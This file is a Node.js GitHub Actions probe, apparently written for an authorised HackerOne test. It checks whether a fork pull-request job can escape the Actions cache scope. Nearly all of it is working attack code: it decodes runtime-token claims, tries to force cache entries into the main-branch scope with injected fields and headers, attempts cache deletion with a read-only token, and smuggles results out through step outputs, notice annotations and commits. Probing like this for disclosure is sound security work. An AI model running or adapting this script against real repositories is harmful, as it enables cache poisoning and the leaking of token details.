// LANE A7 cache-branch-isolation - in-job probe of the Actions cache scope boundary.
// Runs inside a node20 action because ACTIONS_RUNTIME_TOKEN / ACTIONS_RESULTS_URL are
// absent from `run:` steps. Only in-scope hosts are contacted:
//   results-receiver.actions.githubusercontent.com  (*.githubusercontent.com)
//   api.github.com
// Signed storage URLs are captured and NEVER fetched.
const https = require('https');
const fs = require('fs');
const { URL } = require('url');

const E = process.env;
const RT = E.ACTIONS_RUNTIME_TOKEN || '';
const RESULTS = (E.ACTIONS_RESULTS_URL || '').replace(/\/+$/, '');
const CACHEURL = (E.ACTIONS_CACHE_URL || '').replace(/\/+$/, '');
const CACHESVCV2 = E.ACTIONS_CACHE_SERVICE_V2 || '';
const GHTOK = E.INPUT_GHTOK || '';
const MODE = (E.INPUT_MODE || 'pr').toLowerCase();
const NONCE = E.INPUT_NONCE || 'n0';
const MAINKEY = E.INPUT_MAINKEY || '';
const MAINVER = E.INPUT_MAINVER || '';
const PROBEKEY = E.INPUT_PROBEKEY || '';

const BUF = [];
function L(...a) { const s = a.join(' '); BUF.push(s); process.stdout.write(s + '\n'); }
function flat(s, n) { return String(s === undefined || s === null ? '' : s).replace(/[\r\n]+/g, ' ').slice(0, n || 600); }

// annotation channel: readable from api.github.com check-runs annotations (in scope),
// needed because a fork pull_request job has a read-only token and cannot PUT contents.
function notice(title, msg) {
  process.stdout.write('::notice title=' + title + '::' + String(msg).replace(/%/g, '%25').replace(/\r/g, '%0D').replace(/\n/g, '%0A') + '\n');
}

function b64u(s) {
  s = s.replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return Buffer.from(s, 'base64').toString('utf8');
}
function enc(s) { return Buffer.from(String(s)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); }

function claims(tok, tag) {
  try {
    const p = tok.split('.');
    if (p.length < 2) { L('@@JWT|' + tag + '|not-a-jwt|len=' + tok.length); return {}; }
    const pl = JSON.parse(b64u(p[1]));
    L('@@JWT|' + tag + '|claimnames|' + Object.keys(pl).sort().join(','));
    for (const k of ['iss', 'aud', 'sub', 'exp', 'ac', 'scp', 'repository_id', 'owner_id', 'repository_owner_id',
      'repository_visibility', 'run_id', 'job_id', 'job_workflow_ref', 'trust_tier', 'plan_id', 'billing_owner_id']) {
      if (pl[k] !== undefined) L('@@JWT|' + tag + '|' + k + '|' + (typeof pl[k] === 'string' ? pl[k] : JSON.stringify(pl[k])));
    }
    return pl;
  } catch (e) { L('@@JWT|' + tag + '|decode-error|' + e.message); return {}; }
}

function req(method, urlStr, headers, body, timeout) {
  return new Promise((res) => {
    let u;
    try { u = new URL(urlStr); } catch (e) { return res({ status: -1, body: 'badurl ' + e.message, headers: {} }); }
    const h = Object.assign({ 'User-Agent': 'cb-iso-lane-a7', 'X-HackerOne': 'larocas' }, headers);
    if (body !== undefined && body !== null) h['Content-Length'] = Buffer.byteLength(body);
    const r = https.request({ host: u.hostname, port: 443, path: u.pathname + u.search, method, headers: h, timeout: timeout || 25000 }, (rs) => {
      let d = '';
      rs.on('data', c => d += c);
      rs.on('end', () => res({ status: rs.statusCode, body: d, headers: rs.headers }));
    });
    r.on('timeout', () => { r.destroy(); res({ status: -2, body: 'timeout', headers: {} }); });
    r.on('error', e => res({ status: -3, body: 'err ' + e.message, headers: {} }));
    if (body !== undefined && body !== null) r.write(body);
    r.end();
  });
}

async function twirp(label, svcMethod, obj, opts) {
  opts = opts || {};
  if (!RESULTS) { L('@@P|' + label + '|SKIP|no-results-url'); return null; }
  const url = RESULTS + '/twirp/github.actions.results.api.v1.' + svcMethod;
  const body = opts.rawBody !== undefined ? opts.rawBody : JSON.stringify(obj);
  const hd = Object.assign({ 'Content-Type': opts.ct || 'application/json', 'Authorization': 'Bearer ' + (opts.tok !== undefined ? opts.tok : RT) }, opts.hdr || {});
  const r = await req('POST', url, hd, body, opts.timeout);
  // never fetch a signed storage URL: capture host + first bytes only
  let shown = r.body;
  try {
    const j = JSON.parse(r.body);
    for (const f of ['signed_upload_url', 'signedUploadUrl', 'signed_download_url', 'signedDownloadUrl']) {
      if (j[f]) { const uu = new URL(j[f]); j[f] = '<SIGNED ' + uu.hostname + uu.pathname.slice(0, 60) + ' len=' + j[f].length + '>'; }
    }
    shown = JSON.stringify(j);
  } catch (e) { /* non-json */ }
  L('@@P|' + label + '|' + r.status + '|' + flat(shown, 500) + '|req=' + flat(body, 260));
  return r;
}

async function gh(label, method, path, body, tok) {
  const r = await req(method, 'https://api.github.com' + path, {
    'Authorization': 'Bearer ' + (tok || GHTOK), 'Accept': 'application/vnd.github+json',
    'Content-Type': 'application/json', 'X-GitHub-Api-Version': '2022-11-28'
  }, body);
  L('@@GH|' + label + '|' + r.status + '|' + flat(r.body, 420));
  return r;
}

function report(tag) {
  return new Promise((res) => {
    if (!GHTOK) return res();
    const path = '/repos/' + E.GITHUB_REPOSITORY + '/contents/cb_' + tag + '_' + E.GITHUB_RUN_ID + '.log';
    const body = JSON.stringify({ message: 'lane a7 ' + tag, content: Buffer.from(BUF.join('\n')).toString('base64') });
    const r = https.request({
      host: 'api.github.com', path, method: 'PUT', headers: {
        'Authorization': 'Bearer ' + GHTOK, 'User-Agent': 'cb-iso-lane-a7', 'X-HackerOne': 'larocas',
        'Accept': 'application/vnd.github+json', 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body)
      }
    }, rs => { let d = ''; rs.on('data', c => d += c); rs.on('end', () => { process.stdout.write('@@REPORT|' + rs.statusCode + '|' + d.slice(0, 120).replace(/\n/g, ' ') + '\n'); res(); }); });
    r.on('error', e => { process.stdout.write('@@REPORT|err|' + e.message + '\n'); res(); });
    r.write(body); r.end();
  });
}

const V1 = '0000000000000000000000000000000000000000000000000000000000000001';

(async () => {
  L('@@ENV|mode|' + MODE + '|nonce|' + NONCE);
  L('@@ENV|repo|' + E.GITHUB_REPOSITORY + '|ref|' + E.GITHUB_REF + '|headref|' + E.GITHUB_HEAD_REF + '|baseref|' + E.GITHUB_BASE_REF);
  L('@@ENV|event|' + E.GITHUB_EVENT_NAME + '|sha|' + E.GITHUB_SHA + '|runid|' + E.GITHUB_RUN_ID + '|actor|' + E.GITHUB_ACTOR);
  L('@@ENV|results|' + RESULTS + '|cacheurl|' + CACHEURL + '|cachev2|' + CACHESVCV2);
  const pl = claims(RT, 'runtime');
  const acRaw = pl.ac === undefined ? '' : (typeof pl.ac === 'string' ? pl.ac : JSON.stringify(pl.ac));
  notice('AC', 'ac=' + acRaw);
  notice('IDS', 'repo=' + E.GITHUB_REPOSITORY + ' ref=' + E.GITHUB_REF + ' event=' + E.GITHUB_EVENT_NAME + ' vis=' + pl.repository_visibility + ' repoid=' + pl.repository_id + ' run=' + pl.run_id);
  // hand the encoded ac claim to the workflow so a cache key can carry it out of an
  // unprivileged job (a fork pull_request token cannot write contents or comments)
  if (E.GITHUB_OUTPUT) {
    try { fs.appendFileSync(E.GITHUB_OUTPUT, 'ac=' + enc(acRaw) + '\n'); } catch (e) { L('@@OUT|err|' + e.message); }
  }

  const ownRun = pl.run_id ? undefined : undefined;
  // backend ids as the toolkit sends them
  const RUNBID = E.GITHUB_RUN_ID || '';

  if (MODE === 'main') {
    // ---- privileged default-branch baseline -------------------------------------
    await twirp('MAIN-create-fresh', 'CacheService/CreateCacheEntry', { key: 'cbmain-raw-' + NONCE, version: V1 });
    await twirp('MAIN-create-fresh-again', 'CacheService/CreateCacheEntry', { key: 'cbmain-raw-' + NONCE, version: V1 });
    await twirp('MAIN-read-neverwritten', 'CacheService/GetCacheEntryDownloadURL', { key: 'cbnever-' + NONCE, version: V1 });
    if (MAINKEY) await twirp('MAIN-read-mainkey', 'CacheService/GetCacheEntryDownloadURL', { key: MAINKEY, version: MAINVER || V1 });
    await gh('MAIN-list-caches', 'GET', '/repos/' + E.GITHUB_REPOSITORY + '/actions/caches?per_page=100');
    await report('main');
  }

  if (MODE === 'pr') {
    // ---- unprivileged fork pull_request job -------------------------------------
    // every key is FIRST-TOUCHED here so the 409 conflict oracle cannot self-poison
    const K = (s) => 'cbfork-' + s + '-' + NONCE;

    // 1. plain create on a fresh key: which scope does the service pick?
    const r1 = await twirp('PR-create-plain', 'CacheService/CreateCacheEntry', { key: K('plain'), version: V1 });
    // 2. can ANY body field steer the scope? unknown fields, one axis at a time
    for (const [nm, extra] of [
      ['scope', { scope: 'refs/heads/main' }],
      ['ref', { ref: 'refs/heads/main' }],
      ['cacheScope', { cacheScope: 'refs/heads/main' }],
      ['branch', { branch: 'main' }],
      ['gitRef', { gitRef: 'refs/heads/main' }],
      ['scopeRef', { scopeRef: 'refs/heads/main' }],
      ['restoreKeys', { restoreKeys: ['refs/heads/main'] }],
      ['permission', { permission: 3 }],
      ['workflowRunBackendId', { workflowRunBackendId: '00000000-0000-0000-0000-000000000000' }],
    ]) {
      await twirp('PR-steer-' + nm, 'CacheService/CreateCacheEntry', Object.assign({ key: K('st-' + nm), version: V1 }, extra));
    }
    // 3. the same probes with the twirp JSON option that tolerates unknown fields
    await twirp('PR-steer-scope-ct-json-utf8', 'CacheService/CreateCacheEntry', null,
      { ct: 'application/json; charset=utf-8', rawBody: JSON.stringify({ key: K('st-ctj'), version: V1, scope: 'refs/heads/main' }) });
    // 4. header steering
    for (const [nm, hdr] of [
      ['x-scope', { 'X-Actions-Cache-Scope': 'refs/heads/main' }],
      ['x-ref', { 'X-GitHub-Ref': 'refs/heads/main' }],
      ['x-branch', { 'X-Actions-Ref': 'refs/heads/main' }],
    ]) {
      await twirp('PR-hdr-' + nm, 'CacheService/CreateCacheEntry', { key: K('h-' + nm), version: V1 }, { hdr });
    }
    // 5. read direction: documented as allowed (pr can restore from the base default branch)
    if (MAINKEY) {
      await twirp('PR-read-mainkey-exact', 'CacheService/GetCacheEntryDownloadURL', { key: MAINKEY, version: MAINVER || V1 });
      await twirp('PR-read-mainkey-restorekeys', 'CacheService/GetCacheEntryDownloadURL', { key: 'zzz-no-such-' + NONCE, restoreKeys: [MAINKEY.slice(0, 12)], version: MAINVER || V1 });
    }
    await twirp('PR-read-neverwritten', 'CacheService/GetCacheEntryDownloadURL', { key: 'cbnever-' + NONCE, version: V1 });
    // 6. delete direction through the REST cache API with the read-only job token
    if (MAINKEY) {
      await gh('PR-del-bykey', 'DELETE', '/repos/' + E.GITHUB_REPOSITORY + '/actions/caches?key=' + encodeURIComponent(MAINKEY));
      await gh('PR-list-caches', 'GET', '/repos/' + E.GITHUB_REPOSITORY + '/actions/caches?per_page=100');
    }
    // 7. legacy v1 cache service (second handler on the same object) if still wired
    if (CACHEURL) {
      const lr = await req('GET', CACHEURL + '/_apis/artifactcache/cache?keys=' + encodeURIComponent(MAINKEY || 'x') + '&version=' + (MAINVER || V1),
        { 'Authorization': 'Bearer ' + RT, 'Accept': 'application/json;api-version=6.0-preview.1' });
      L('@@P|PR-legacy-get|' + lr.status + '|' + flat(lr.body, 400));
      const lp = await req('POST', CACHEURL + '/_apis/artifactcache/caches',
        { 'Authorization': 'Bearer ' + RT, 'Content-Type': 'application/json', 'Accept': 'application/json;api-version=6.0-preview.1' },
        JSON.stringify({ key: K('legacy'), version: V1 }));
      L('@@P|PR-legacy-reserve|' + lp.status + '|' + flat(lp.body, 400));
    }
    notice('PRDONE', 'probes=' + BUF.filter(x => x.startsWith('@@P|')).length + ' create-plain=' + (r1 ? r1.status : 'n/a'));
    // dump the whole log through annotations, 900 chars per chunk
    const all = BUF.join('\n');
    for (let i = 0, n = 0; i < all.length && n < 9; i += 900, n++) notice('LOG' + n, all.slice(i, i + 900));
    await report('pr'); // expected to fail 403 on a fork pr, captured as a control
  }

  if (MODE === 'restore') {
    // ---- privileged default-branch read of what the fork wrote -------------------
    const probes = (PROBEKEY || '').split('|').filter(Boolean);
    for (const k of probes) {
      await twirp('RST-exact-' + k, 'CacheService/GetCacheEntryDownloadURL', { key: k, version: V1 });
      await twirp('RST-prefix-' + k, 'CacheService/GetCacheEntryDownloadURL', { key: 'zzz-miss-' + NONCE, restoreKeys: [k.slice(0, 14)], version: V1 });
    }
    if (MAINKEY) await twirp('RST-poscontrol-mainkey', 'CacheService/GetCacheEntryDownloadURL', { key: MAINKEY, version: MAINVER || V1 });
    await twirp('RST-negcontrol-never', 'CacheService/GetCacheEntryDownloadURL', { key: 'cbnever-' + NONCE, version: V1 });
    await gh('RST-list-caches', 'GET', '/repos/' + E.GITHUB_REPOSITORY + '/actions/caches?per_page=100');
    await report('restore');
  }

  L('@@DONE|' + MODE);
})();
